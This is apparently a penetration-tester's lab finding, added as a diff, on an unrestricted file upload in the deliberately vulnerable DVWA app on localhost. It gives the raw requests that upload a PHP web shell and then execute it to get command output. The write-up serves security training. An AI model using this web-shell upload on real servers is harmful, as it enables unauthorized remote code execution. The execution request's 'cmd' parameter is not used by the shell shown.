@@ -1,0 +1,65 @@
+========================================================
+FINDING F-04 — Unrestricted File Upload / Remote Code Execution
+Target: DVWA | Module: File Upload | Security Level: Low
+========================================================
+
+--- REQUEST 1 — Uploading the malicious PHP file ---
+
+POST http://localhost:8080/vulnerabilities/upload/ HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID=<your-session-id>; security=low
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php
+echo shell_exec("whoami");
+?>
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="Upload"
+
+Upload
+------WebKitFormBoundary--
+
+--- RESPONSE TO UPLOAD REQUEST ---
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+../../hackable/uploads/shell.php succesfully uploaded!
+
+The server confirmed the PHP file was saved to a web-accessible
+directory on the server.
+
+--- REQUEST 2 — Executing the uploaded shell ---
+
+GET http://localhost:8080/hackable/uploads/shell.php?cmd=whoami HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID=<your-session-id>; security=low
+
+--- RESPONSE TO EXECUTION REQUEST ---
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+www-data
+
+The server executed the PHP file and returned the result of the
+whoami OS command, confirming full Remote Code Execution (RCE).
+
+--- OBSERVATION ---
+
+The server accepted a PHP file without checking the file extension,
+MIME type, or file contents. The uploaded file was stored in a
+directory served by the web server, making it directly accessible
+and executable via a browser request. This is a two-step exploit:
+upload, then browse to the shell URL with a command parameter.
+
+========================================================
+Tool used: Browser (Firefox) — DVWA built-in file upload form
+Date: 03 june 2026
+Tester: Indrajit Singh
+========================================================
